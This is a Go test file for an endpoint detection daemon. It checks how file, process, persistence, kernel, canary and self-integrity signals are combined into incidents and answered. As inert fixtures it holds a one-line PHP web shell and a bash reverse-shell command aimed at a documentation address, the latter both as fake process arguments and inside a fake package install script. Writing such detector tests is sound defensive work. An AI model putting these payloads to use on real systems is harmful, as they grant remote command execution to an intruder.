package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/1ungaka/sentinel-edr/internal/canary"
	"github.com/1ungaka/sentinel-edr/internal/correlate"
	"github.com/1ungaka/sentinel-edr/internal/quarantine"
	"github.com/1ungaka/sentinel-edr/internal/selftest"
	"github.com/1ungaka/sentinel-edr/internal/watch"
	"github.com/1ungaka/sentinel-edr/scanner"
)

// inert text with the shape the file layer flags. It never runs: the fixture
// process is `sleep`, whose /proc entry merely points here.
const fixtureShell = "<?php system($_GET['c']); ?>\n"

const tcpTable = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n" +
	"   0: 0100007F:A0B4 0200A8C0:115C 01 00000000:00000000 00:00000000 00000000  1000        0 777 1 0000 20 4\n"

type fixture struct {
	dir, proc, root, store string
	out                    bytes.Buffer
	d                      *defender
}

func newFixture(t *testing.T) *fixture {
	t.Helper()
	f := &fixture{dir: t.TempDir()}
	f.proc, f.root, f.store = filepath.Join(f.dir, "proc"), filepath.Join(f.dir, "root"), filepath.Join(f.dir, "vault")
	for _, d := range []string{f.proc, filepath.Join(f.root, "etc")} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	f.d = &defender{
		engine:   &scanner.Engine{Tradecraft: true, Heuristics: true},
		procRoot: f.proc, persistRoot: f.root, hostRoot: f.root, process: true, persistence: true,
		store: f.store, json: true, out: &f.out, warn: func(string, ...interface{}) {},
	}
	f.d.ready()
	return f
}

// child starts a real process the response can reach. The scanner only ever sees
// the fixture /proc, so nothing else on the machine can be signalled.
func child(t *testing.T) *exec.Cmd {
	t.Helper()
	c := exec.Command("sleep", "60")
	if err := c.Start(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = c.Process.Kill(); _ = c.Wait() })
	return c
}

func (f *fixture) addProc(t *testing.T, pid int, comm, exe, cmdline, fd string) {
	t.Helper()
	base := filepath.Join(f.proc, strconv.Itoa(pid))
	for _, d := range []string{"fd", "net"} {
		if err := os.MkdirAll(filepath.Join(base, d), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	for name, body := range map[string]string{"comm": comm + "\n", "cmdline": cmdline + "\x00", "status": "PPid:\t1\n", "net/tcp": tcpTable} {
		if err := os.WriteFile(filepath.Join(base, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	_ = os.Symlink(exe, filepath.Join(base, "exe"))
	if fd != "" {
		_ = os.Symlink(fd, filepath.Join(base, "fd", "0"))
		_ = os.Symlink(fd, filepath.Join(base, "fd", "1"))
	}
}

func (f *fixture) implant(t *testing.T) string {
	t.Helper()
	p := filepath.Join(f.dir, "implant")
	if err := os.WriteFile(p, []byte(fixtureShell), 0o755); err != nil {
		t.Fatal(err)
	}
	return p
}

func (f *fixture) cron(t *testing.T, target string) {
	t.Helper()
	d := filepath.Join(f.root, "etc", "cron.d")
	_ = os.MkdirAll(d, 0o755)
	if err := os.WriteFile(filepath.Join(d, "job"), []byte("* * * * * root /var/tmp/x "+target+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
}

func state(t *testing.T, pid int) string {
	t.Helper()
	b, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
	if err != nil {
		t.Fatal(err)
	}
	return strings.Fields(string(b[strings.LastIndexByte(string(b), ')')+1:]))[0]
}

func hasLayer(inc correlate.Incident, l correlate.Layer) bool {
	for _, x := range inc.Layers {
		if x == l {
			return true
		}
	}
	return false
}

// The whole chain: a live shell, the file it runs, and the entry that restarts
// it are one incident, and the response reaches both.
func TestDefendChainsLayersAndResponds(t *testing.T) {
	f := newFixture(t)
	c := child(t)
	impl := f.implant(t)
	f.addProc(t, c.Process.Pid, "bash", impl, "bash", "socket:[777]")
	f.cron(t, impl)
	f.d.action, f.d.quarantine = "stop", true

	got := f.d.cycle()
	if len(got) != 1 {
		t.Fatalf("one artefact must be one incident, got %d: %s", len(got), f.out.String())
	}
	inc := got[0]
	for _, l := range []correlate.Layer{correlate.LayerProcess, correlate.LayerFile, correlate.LayerPersistence} {
		if !hasLayer(inc, l) {
			t.Errorf("missing layer %s: %+v", l, inc.Layers)
		}
	}
	if !inc.Confirmed {
		t.Fatalf("not confirmed: %+v", inc)
	}
	deadline := time.Now().Add(2 * time.Second)
	for state(t, c.Process.Pid) != "T" && time.Now().Before(deadline) {
		time.Sleep(10 * time.Millisecond)
	}
	if s := state(t, c.Process.Pid); s != "T" {
		t.Fatalf("process not stopped: state %s\n%s", s, f.out.String())
	}
	if _, err := os.Stat(impl); !os.IsNotExist(err) {
		t.Fatalf("the implant should be in the vault: %v\n%s", err, f.out.String())
	}
	s, err := quarantine.Open(f.store)
	if err != nil {
		t.Fatal(err)
	}
	if entries, _ := s.List(); len(entries) != 1 {
		t.Fatalf("vault holds %d entries", len(entries))
	}
	if _, err := os.Stat(filepath.Join(f.root, "etc", "cron.d", "job")); err != nil {
		t.Fatalf("the cron table must never be touched: %v", err)
	}
}

// The rule the whole response stands on: argv text alone never acts, whatever
// the flags say. This is what keeps `grep "/dev/tcp" notes` safe.
func TestDefendArgvAloneAlertsOnly(t *testing.T) {
	f := newFixture(t)
	c := child(t)
	f.addProc(t, c.Process.Pid, "bash", "/usr/bin/bash", "bash -i >& /dev/tcp/192.0.2.1/443 0>&1", "")
	f.d.action = "kill"

	got := f.d.cycle()
	if len(got) != 1 || got[0].Confirmed {
		t.Fatalf("must alert, not confirm: %+v", got)
	}
	if strings.Contains(f.out.String(), `"actions"`) {
		t.Fatalf("an unconfirmed incident must record no action: %s", f.out.String())
	}
	// A signal lands asynchronously, so reading the state at once proves nothing.
	time.Sleep(200 * time.Millisecond)
	if s := state(t, c.Process.Pid); s == "T" || s == "Z" {
		t.Fatalf("an unconfirmed process was signalled: state %s", s)
	}
}

// A system executable must never become the thing that is quarantined.
func TestDefendNeverQuarantinesSystemBinary(t *testing.T) {
	f := newFixture(t)
	c := child(t)
	f.addProc(t, c.Process.Pid, "bash", "/usr/bin/bash", "bash", "socket:[777]")
	f.d.action, f.d.quarantine = "stop", true
	got := f.d.cycle()
	if len(got) != 1 || !got[0].Confirmed {
		t.Fatalf("got %+v", got)
	}
	if strings.Contains(f.out.String(), "quarantined") {
		t.Fatalf("a system path was quarantined: %s", f.out.String())
	}
}

// A file dropped now and run later must still join, or waiting beats the chain.
func TestDefendJoinsAcrossTime(t *testing.T) {
	f := newFixture(t)
	impl := f.implant(t)
	f.d.enqueue(impl)
	first := f.d.cycle()
	if len(first) != 1 || first[0].Confirmed {
		t.Fatalf("a lone heuristic file alerts: %+v", first)
	}
	c := child(t)
	f.addProc(t, c.Process.Pid, "sshd", impl, "sshd", "")
	second := f.d.cycle()
	if len(second) != 1 || !second[0].Confirmed || !hasLayer(second[0], correlate.LayerFile) || !hasLayer(second[0], correlate.LayerProcess) {
		t.Fatalf("the later process must join the earlier file: %+v", second)
	}
}

func TestDefendReportsOnceUntilEvidenceChanges(t *testing.T) {
	f := newFixture(t)
	f.d.enqueue(f.implant(t))
	if got := f.d.cycle(); len(got) != 1 {
		t.Fatalf("got %+v", got)
	}
	if got := f.d.cycle(); len(got) != 0 {
		t.Fatalf("the same evidence must not re-alert every cycle: %+v", got)
	}
}

func TestDefendCleanFileDropsOutWhenRewritten(t *testing.T) {
	f := newFixture(t)
	p := f.implant(t)
	f.d.enqueue(p)
	f.d.cycle()
	if err := os.WriteFile(p, []byte("nothing to see\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	f.d.enqueue(p)
	f.d.cycle()
	if e := f.d.files[p]; e.hit {
		t.Fatalf("a cleaned file must stop being evidence: %+v", e)
	}
}

func TestDefendKernelRefusalIsReported(t *testing.T) {
	f := newFixture(t)
	log := filepath.Join(f.dir, "kernel.jsonl")
	line := `{"pid":4242,"tgid":4242,"uid":33,"reason":"netshell","denied":true,"peer":"192.0.2.1:443","comm":"php","exe":"sh"}` + "\n"
	if err := os.WriteFile(log, []byte(line), 0o600); err != nil {
		t.Fatal(err)
	}
	f.d.kernelEvents = log
	got := f.d.cycle()
	if len(got) != 1 || !got[0].Confirmed || !hasLayer(got[0], correlate.LayerKernel) {
		t.Fatalf("got %+v", got)
	}
	if got := f.d.cycle(); len(got) != 0 {
		t.Fatalf("an old log line is not news: %+v", got)
	}
}

func TestDefendCanaryIsLive(t *testing.T) {
	f := newFixture(t)
	m, err := canary.Plant(filepath.Join(f.dir, "decoys"), 1)
	if err != nil {
		t.Fatal(err)
	}
	manifest := filepath.Join(f.dir, "canary.json")
	if err := canary.WriteManifest(manifest, m); err != nil {
		t.Fatal(err)
	}
	f.d.canaryManifest = manifest
	if got := f.d.cycle(); len(got) != 0 {
		t.Fatalf("an intact canary is silent: %+v", got)
	}
	if err := os.WriteFile(m.Canaries[0].Path, []byte("encrypted"), 0o600); err != nil {
		t.Fatal(err)
	}
	got := f.d.cycle()
	if len(got) != 1 || !got[0].Confirmed || !hasLayer(got[0], correlate.LayerCanary) {
		t.Fatalf("a rewritten decoy must confirm: %+v", got)
	}
}

func TestDefendPackageLayer(t *testing.T) {
	f := newFixture(t)
	info := filepath.Join(f.dir, "dpkg")
	_ = os.MkdirAll(info, 0o755)
	body := "#!/bin/sh\nbash -i >& /dev/tcp/192.0.2.1/443 0>&1\n"
	if err := os.WriteFile(filepath.Join(info, "evil.postinst"), []byte(body), 0o755); err != nil {
		t.Fatal(err)
	}
	f.d.dpkgInfo, f.d.packageInterval = info, time.Hour
	got := f.d.cycle()
	if len(got) != 1 || got[0].Confirmed || !hasLayer(got[0], correlate.LayerPackage) {
		t.Fatalf("a package finding alerts alone: %+v", got)
	}
	if got := f.d.cycle(); len(got) != 0 {
		t.Fatalf("the audit keeps its own slower pace: %+v", got)
	}
}

// End to end through the real watcher: a file appears and an alert follows,
// with no scheduled cycle to help it.
func TestDefendRealTimeWatch(t *testing.T) {
	f := newFixture(t)
	f.d.process, f.d.persistence = false, false
	drop := t.TempDir()
	f.d.roots = []string{drop}
	w, err := watch.New(f.d.roots, 0)
	if err != nil {
		t.Skipf("inotify unavailable: %v", err)
	}
	defer w.Close()
	stop := make(chan struct{})
	done := make(chan struct{})
	go func() { f.d.run(w, time.Hour, stop, func(string, ...interface{}) {}); close(done) }()
	defer func() { close(stop); <-done }()

	time.Sleep(100 * time.Millisecond)
	if err := os.WriteFile(filepath.Join(drop, "shell.php"), []byte(fixtureShell), 0o644); err != nil {
		t.Fatal(err)
	}
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		f.d.mu.Lock()
		seen := len(f.d.seen)
		f.d.mu.Unlock()
		if seen > 0 {
			return
		}
		time.Sleep(20 * time.Millisecond)
	}
	t.Fatal("no incident from a dropped file")
}

// A new file in a drop zone must not wait for every layer, but a change to what
// runs at boot must reach the persistence audit at once.
func TestDefendChangeRouting(t *testing.T) {
	f := newFixture(t)
	woken := func() bool {
		select {
		case <-f.d.wakePersistence:
			return true
		default:
			return false
		}
	}
	f.d.enqueue("/tmp/new-file")
	if woken() {
		t.Fatal("a drop-zone file only needs the file layer")
	}
	f.d.enqueue("/etc/cron.d/new-job")
	if !woken() {
		t.Fatal("a persistence change needs the audit now")
	}
	if woken() {
		t.Fatal("the request is consumed by the pass it asked for")
	}
}

// The file path correlates with what the other layers last published.
func TestFileJoinsLastPublishedView(t *testing.T) {
	f := newFixture(t)
	f.d.persistence = false
	impl := f.implant(t)
	f.d.publish(viewPersistence, []correlate.Signal{{Layer: correlate.LayerPersistence, Class: "persist.cron.x", Score: 8, Files: []string{"/etc/cron.d/j", impl}}})
	f.d.enqueue(impl)
	got := f.d.cycle()
	if len(got) != 1 || !got[0].Confirmed {
		t.Fatalf("got %+v", got)
	}
}

func TestDefendVaultIsNotRescanned(t *testing.T) {
	f := newFixture(t)
	f.d.enqueue(filepath.Join(f.store, "blobs", "x"))
	if f.d.queue.size() != 0 {
		t.Fatal("the vault's own writes must not be treated as new files")
	}
}

func TestDefendFlags(t *testing.T) {
	for _, args := range [][]string{{"--format", "xml"}, {"--respond", "nuke"}, {"--interval", "0s"}} {
		var o, e bytes.Buffer
		if code := cmdDefend(args, &o, &e); code != 4 {
			t.Errorf("%v: exit %d, want usage", args, code)
		}
	}
}

func TestDefendJSONIsOneObjectPerLine(t *testing.T) {
	f := newFixture(t)
	f.d.enqueue(f.implant(t))
	f.d.cycle()
	for _, line := range strings.Split(strings.TrimSpace(f.out.String()), "\n") {
		var v map[string]any
		if err := json.Unmarshal([]byte(line), &v); err != nil || v["incident"] == nil {
			t.Fatalf("not an alert line: %q (%v)", line, err)
		}
	}
}

// startDaemon runs the real daemon loop over the fixture and stops it at the end
// of the test, which also proves shutdown never hangs.
func (f *fixture) startDaemon(t *testing.T, roots ...string) *syncWriter {
	t.Helper()
	out := &syncWriter{}
	f.d.out = out
	f.d.roots = roots
	w, err := watch.New(roots, 0)
	if err != nil {
		t.Skipf("inotify unavailable: %v", err)
	}
	stop, done := make(chan struct{}), make(chan struct{})
	go func() { f.d.run(w, time.Hour, stop, func(string, ...interface{}) {}); close(done) }()
	t.Cleanup(func() {
		close(stop)
		select {
		case <-done:
		case <-time.After(30 * time.Second):
			t.Error("the daemon did not shut down")
		}
		_ = w.Close()
	})
	return out
}

type syncWriter struct {
	mu sync.Mutex
	b  bytes.Buffer
}

func (w *syncWriter) Write(p []byte) (int, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	return w.b.Write(p)
}

func (w *syncWriter) String() string {
	w.mu.Lock()
	defer w.mu.Unlock()
	return w.b.String()
}

func (w *syncWriter) incidents(t *testing.T) []correlate.Incident {
	t.Helper()
	var out []correlate.Incident
	for _, line := range strings.Split(strings.TrimSpace(w.String()), "\n") {
		var v struct{ Incident correlate.Incident }
		if line != "" && json.Unmarshal([]byte(line), &v) == nil {
			out = append(out, v.Incident)
		}
	}
	return out
}

func waitFor(t *testing.T, what string, ok func() bool) {
	t.Helper()
	deadline := time.Now().Add(10 * time.Second)
	for !ok() {
		if time.Now().After(deadline) {
			t.Fatalf("timed out waiting for %s", what)
		}
		time.Sleep(2 * time.Millisecond)
	}
}

// The regression this design exists for. A layer stuck in the middle of a pass,
// as the package audit used to be for ten seconds at a time, must delay nothing
// but itself: the dropped file still has to alert while it hangs.
func TestStuckLayerDoesNotHoldADroppedFile(t *testing.T) {
	f := newFixture(t)
	f.d.process, f.d.persistence = false, false
	f.d.canaryManifest = filepath.Join(f.dir, "no-such-manifest")
	release := make(chan struct{})
	var stuck atomic.Bool
	f.d.warn = func(string, ...interface{}) {
		stuck.Store(true)
		<-release
	}
	drop := t.TempDir()
	out := f.startDaemon(t, drop)
	t.Cleanup(func() { close(release) }) // runs before startDaemon's cleanup
	waitFor(t, "the layer to be stuck", stuck.Load)

	if err := os.WriteFile(filepath.Join(drop, "shell.php"), []byte(fixtureShell), 0o644); err != nil {
		t.Fatal(err)
	}
	waitFor(t, "the alert", func() bool { return len(out.incidents(t)) == 1 })
}

// The scenario end to end through the real watcher and audit: a dropped file
// alerts, the entry that runs it arrives afterwards, and that confirms it with no
// scheduled pass to help.
func TestDroppedFileThenPersistenceEntryConfirms(t *testing.T) {
	f := newFixture(t)
	f.d.process = false
	drop := t.TempDir()
	cron := filepath.Join(f.root, "etc", "cron.d")
	if err := os.MkdirAll(cron, 0o755); err != nil {
		t.Fatal(err)
	}
	zones := dropZones
	dropZones = []string{drop + "/"} // the fixture lives under /tmp, itself a drop zone
	t.Cleanup(func() { dropZones = zones })
	out := f.startDaemon(t, drop, cron)
	time.Sleep(100 * time.Millisecond) // let the first passes finish, with nothing to see

	impl := filepath.Join(drop, "shell.php")
	if err := os.WriteFile(impl, []byte(fixtureShell), 0o644); err != nil {
		t.Fatal(err)
	}
	waitFor(t, "the alert", func() bool { return len(out.incidents(t)) == 1 })
	if inc := out.incidents(t)[0]; inc.Confirmed {
		t.Fatalf("one layer must only alert: %+v", inc)
	}
	if err := os.WriteFile(filepath.Join(cron, "job"), []byte("* * * * * root /var/tmp/x "+impl+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	waitFor(t, "confirmation", func() bool {
		for _, inc := range out.incidents(t) {
			if inc.Confirmed && hasLayer(inc, correlate.LayerFile) && hasLayer(inc, correlate.LayerPersistence) {
				return true
			}
		}
		return false
	})
}

// A persistence entry no watch covers would otherwise wait for the next interval
// to join: a new hit asks the other layers now.
func TestNewHitWakesTheOtherLayers(t *testing.T) {
	f := newFixture(t)
	impl := f.implant(t)
	f.d.scanFile(impl, impl)
	select {
	case <-f.d.wakePersistence:
	default:
		t.Fatal("a new hit must wake the persistence audit")
	}
	if err := os.WriteFile(impl, []byte(fixtureShell+"# changed\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	f.d.scanFile(impl, impl)
	select {
	case <-f.d.wakePersistence:
		t.Fatal("a file already flagged must not keep waking the audit, or a noisy one spins it")
	default:
	}
}

func TestManyDropsRaiseOneIncidentEach(t *testing.T) {
	f := newFixture(t)
	f.d.process, f.d.persistence = false, false
	drop := t.TempDir()
	out := f.startDaemon(t, drop)
	time.Sleep(50 * time.Millisecond)
	const n = 200
	for i := range n {
		if err := os.WriteFile(filepath.Join(drop, fmt.Sprintf("s%d.php", i)), []byte(fixtureShell), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	waitFor(t, "every alert", func() bool { return len(out.incidents(t)) >= n })
	if got := out.incidents(t); len(got) != n {
		t.Fatalf("%d incidents from %d files", len(got), n)
	}
}

// Text output is several lines per incident, so concurrent ones must not mix.
func TestConcurrentIncidentsNeverInterleave(t *testing.T) {
	f := newFixture(t)
	f.d.json = false
	var wg sync.WaitGroup
	for i := range 50 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			f.d.emit(correlate.Incident{ID: fmt.Sprintf("id%d", i), Why: "why", Files: []string{"/a", "/b"}}, nil)
		}()
	}
	wg.Wait()
	blocks := strings.Split(f.out.String(), "\n [!] ")
	if len(blocks) != 51 {
		t.Fatalf("%d blocks", len(blocks))
	}
	for _, b := range blocks[1:] {
		if !strings.HasPrefix(b, "ALERT incident id") || strings.Count(b, "file   :") != 2 {
			t.Fatalf("mixed output: %q", b)
		}
	}
}

// Two incidents can name one file while the first is still moving it. The file is
// large and the responders are released together so that, without the lock, they
// really do overlap: every one of them gets past the check that the file exists
// long before the first has finished reading it into the vault.
func TestConcurrentResponsesQuarantineOnce(t *testing.T) {
	f := newFixture(t)
	f.d.quarantine = true
	impl := filepath.Join(f.dir, "large-implant")
	if err := os.WriteFile(impl, make([]byte, 16<<20), 0o755); err != nil {
		t.Fatal(err)
	}
	// Flagged directly: only a flagged file moves, and scanning 16 MiB of a real
	// fixture would hide the overlap this test is here to force.
	sig := correlate.Signal{Layer: correlate.LayerFile, Class: "file.suspicious", Score: 8, Files: []string{impl}}
	f.d.scanFile(impl, impl)
	e := f.d.files[impl]
	e.hit, e.signal, e.racy = true, sig, false
	f.d.files[impl], f.d.hits[impl] = e, sig
	inc := correlate.Incident{ID: "x", Confirmed: true, Signals: []correlate.Signal{sig}}
	var wg sync.WaitGroup
	var moved atomic.Int32
	gate := make(chan struct{})
	for range 8 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			<-gate
			for _, a := range f.d.respond(inc, nil) {
				if strings.HasPrefix(a, "quarantined") {
					moved.Add(1)
				}
			}
		}()
	}
	close(gate)
	wg.Wait()
	if moved.Load() != 1 {
		t.Fatalf("quarantined %d times", moved.Load())
	}
	s, err := quarantine.Open(f.store)
	if err != nil {
		t.Fatal(err)
	}
	if entries, _ := s.List(); len(entries) != 1 {
		t.Fatalf("vault holds %d entries", len(entries))
	}
}

// A detector crashing on a file is news whether or not the retry worked, and it
// must reach the operator as an alert.
func TestDetectorPanicAlerts(t *testing.T) {
	for _, recovered := range []bool{true, false} {
		r := scanner.ScanResult{Verdict: scanner.VerdictClean, Panics: []scanner.DetectorPanic{{Detector: "pdf", Value: "index out of range", Attempts: 2, Recovered: recovered}}}
		if !recovered {
			r.Verdict = scanner.VerdictError
		}
		sig, hit := fileSignal("/srv/report.pdf", r, nil)
		if !hit || sig.Class != "file.detector-panic" || !strings.Contains(sig.Detail, "pdf") {
			t.Fatalf("recovered=%v: not raised: %+v", recovered, sig)
		}
	}
}

// The other half of that rule. A parser bug can be tripped by a harmless file, so
// a crash alone must never move a file or stop a process.
func TestDetectorPanicAloneNeverActs(t *testing.T) {
	r := scanner.ScanResult{Verdict: scanner.VerdictError, Panics: []scanner.DetectorPanic{{Detector: "pdf", Value: "boom", Attempts: 2}}}
	sig, _ := fileSignal("/srv/report.pdf", r, nil)
	got := correlate.Build([]correlate.Signal{sig})
	if len(got) != 1 || got[0].Confirmed {
		t.Fatalf("a crash must only alert: %+v", got)
	}
	if p := correlate.PlanFor(got[0]); len(p.Quarantine) != 0 || len(p.Stop) != 0 {
		t.Fatalf("a crash planned a response: %+v", p)
	}
}

func TestDetectorPanicKeepsTheStrongerVerdict(t *testing.T) {
	r := scanner.ScanResult{Verdict: scanner.VerdictMalicious, ThreatName: "x", Detected: true,
		Panics: []scanner.DetectorPanic{{Detector: "pdf", Value: "boom", Attempts: 2}}}
	sig, hit := fileSignal("/srv/x", r, nil)
	if !hit || sig.Class != "file.malicious" || !sig.Definitive || !strings.Contains(sig.Detail, "pdf") {
		t.Fatalf("got %+v", sig)
	}
}

// A task that panics gets its retry at once, the operator hears about it on the
// incident stream, and the rest of the daemon keeps working throughout.
func TestCrashedTaskRetriesAndAlerts(t *testing.T) {
	f := newFixture(t)
	f.d.process, f.d.persistence = false, false
	f.d.canaryManifest = filepath.Join(f.dir, "no-such-manifest")
	var calls atomic.Int32
	f.d.warn = func(string, ...interface{}) {
		if calls.Add(1) == 1 {
			panic("the canary layer fell over")
		}
	}
	drop := t.TempDir()
	out := f.startDaemon(t, drop)
	waitFor(t, "the crash alert", func() bool { return strings.Contains(out.String(), "defend.crash.canary") })
	waitFor(t, "the retry", func() bool { return calls.Load() >= 2 })

	inc := out.incidents(t)[0]
	if inc.Confirmed || !hasLayer(inc, correlate.LayerSelf) {
		t.Fatalf("a crash is an alert about the agent: %+v", inc)
	}
	if err := os.WriteFile(filepath.Join(drop, "shell.php"), []byte(fixtureShell), 0o644); err != nil {
		t.Fatal(err)
	}
	waitFor(t, "a file alert after the crash", func() bool { return len(out.incidents(t)) >= 2 })
}

// A panic that repeats must not spin the daemon or repeat the alert.
func TestRepeatingCrashIsBoundedAndAlertsOnce(t *testing.T) {
	f := newFixture(t)
	f.d.process, f.d.persistence = false, false
	f.d.canaryManifest = filepath.Join(f.dir, "no-such-manifest")
	var calls atomic.Int32
	f.d.warn = func(string, ...interface{}) {
		calls.Add(1)
		panic("always")
	}
	out := f.startDaemon(t, t.TempDir())
	waitFor(t, "the crash alert", func() bool { return strings.Contains(out.String(), "defend.crash.canary") })
	time.Sleep(100 * time.Millisecond)
	if n := calls.Load(); n != defendAttempts {
		t.Fatalf("%d attempts, want %d until the next trigger", n, defendAttempts)
	}
	if n := strings.Count(out.String(), "defend.crash.canary\""); n != 1 {
		t.Fatalf("raised %d times", n)
	}
}

// A retried join must not have lost the events the crashed one was holding.
func TestOnceOnlyEvidenceSurvivesAFailedJoin(t *testing.T) {
	f := newFixture(t)
	refusal := correlate.Signal{Layer: correlate.LayerKernel, Class: "kernel.refused.netshell", Score: 9, PID: 42, Live: true}
	f.d.events = []correlate.Signal{refusal}
	bad := correlate.Signal{Layer: correlate.LayerFile, Files: []string{"/srv/x"}}
	f.d.hits["/srv/x"] = bad
	if fresh, _ := f.d.join(); len(fresh) != 2 {
		t.Fatalf("got %+v", fresh)
	}
	if len(f.d.events) != 0 {
		t.Fatal("events are once-only: a join that finished must consume them")
	}
	if fresh, _ := f.d.join(); len(fresh) != 0 {
		t.Fatalf("raised again: %+v", fresh)
	}
}

// Overflow means events were lost, which can include a change to what runs at boot.
func TestOverflowWakesTheHostLayers(t *testing.T) {
	f := newFixture(t)
	f.d.process, f.d.persistence = false, true
	dir := t.TempDir()
	f.d.roots = []string{dir}
	f.d.requestSweep()
	f.d.wakeHostLayers()
	select {
	case <-f.d.wakeSweep:
	default:
		t.Fatal("no sweep requested")
	}
	select {
	case <-f.d.wakePersistence:
	default:
		t.Fatal("the audit was not woken")
	}
}

func TestOnceDrainsEverythingInOnePass(t *testing.T) {
	f := newFixture(t)
	f.d.process, f.d.persistence = false, false
	dir := t.TempDir()
	const n = 300 // more than one old per-cycle batch would matter for; the point is one pass
	for i := range n {
		if err := os.WriteFile(filepath.Join(dir, fmt.Sprintf("s%d.php", i)), []byte(fixtureShell), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	f.d.roots = []string{dir}
	f.d.sweepDue.Store(true)
	if got := f.d.cycle(); len(got) != n {
		t.Fatalf("%d incidents from %d files", len(got), n)
	}
	if f.d.queue.size() != 0 {
		t.Fatal("left work queued")
	}
}

// A synchronous run's output is compared by scripts, so it stays strongest first
// even though the incidents are handled at once.
func TestOnceOutputKeepsItsOrder(t *testing.T) {
	f := newFixture(t)
	f.d.process, f.d.persistence = false, false
	dir := t.TempDir()
	var files []string
	for i := range 40 {
		p := filepath.Join(dir, fmt.Sprintf("s%02d.php", i))
		if err := os.WriteFile(p, []byte(fixtureShell), 0o644); err != nil {
			t.Fatal(err)
		}
		files = append(files, p)
		f.d.enqueue(p)
	}
	got := f.d.cycle()
	var printed []string
	for _, line := range strings.Split(strings.TrimSpace(f.out.String()), "\n") {
		var v struct{ Incident correlate.Incident }
		if err := json.Unmarshal([]byte(line), &v); err != nil {
			t.Fatal(err)
		}
		printed = append(printed, v.Incident.ID)
	}
	if len(printed) != len(got) || len(got) != len(files) {
		t.Fatalf("%d printed, %d returned", len(printed), len(got))
	}
	for i := range got {
		if printed[i] != got[i].ID {
			t.Fatalf("position %d differs from the returned order", i)
		}
	}
}

// A baseline recorded now and content unchanged is silent; editing the content
// is detection content having been tampered with — T1562.001 — and must raise
// a confirmed self-layer incident the operator sees.
func TestDefendSelftestLayerCatchesTamper(t *testing.T) {
	f := newFixture(t)
	dbPath := filepath.Join(f.dir, "signatures.txt")
	if err := os.WriteFile(dbPath, []byte("sha256:deadbeef threat\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	m, err := selftest.Compute([]selftest.Resource{{Name: "signatures", Path: dbPath}})
	if err != nil {
		t.Fatal(err)
	}
	manifest := filepath.Join(f.dir, "integrity.json")
	if err := selftest.WriteManifest(manifest, m); err != nil {
		t.Fatal(err)
	}
	f.d.selftestManifest, f.d.selftestInterval = manifest, time.Hour

	if got := f.d.cycle(); len(got) != 0 {
		t.Fatalf("intact content must be silent: %+v", got)
	}
	if err := os.WriteFile(dbPath, []byte("# gutted\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	got := f.d.cycle()
	if len(got) != 1 || !got[0].Confirmed || !hasLayer(got[0], correlate.LayerSelf) {
		t.Fatalf("tamper must confirm on the self layer: %+v", got)
	}
}

// The feed layer re-reads from disk, so operators who refresh the feed while
// the daemon runs do not have to restart it.
func TestDefendFeedHotReloads(t *testing.T) {
	f := newFixture(t)
	feed := filepath.Join(f.dir, "feed.txt")
	if err := os.WriteFile(feed, []byte("1.2.3.4\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	f.d.feedPath = feed
	f.d.feedLayer()
	first := f.d.feed.Load()
	if first == nil || first.Count() == 0 {
		t.Fatal("initial feed load produced nothing")
	}
	if err := os.WriteFile(feed, []byte("1.2.3.4\n5.6.7.8\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	f.d.feedLayer()
	second := f.d.feed.Load()
	if second == nil || second == first {
		t.Fatal("the feed pointer must have been replaced")
	}
	if second.Count() <= first.Count() {
		t.Fatalf("the new feed should have more indicators: before=%d after=%d", first.Count(), second.Count())
	}
}

// The selftest layer must stay a quiet no-op when no baseline is present on
// the host: that is an install without `cau selftest --record`, not a tamper.
func TestDefendSelftestSilentWithoutBaseline(t *testing.T) {
	f := newFixture(t)
	if got := f.d.cycle(); len(got) != 0 {
		t.Fatalf("no baseline must be silent: %+v", got)
	}
	f.d.selftestLayer()
	f.d.mu.Lock()
	n := len(f.d.views[viewSelftest])
	f.d.mu.Unlock()
	if n != 0 {
		t.Fatalf("no baseline must publish no signals, got %d", n)
	}
}
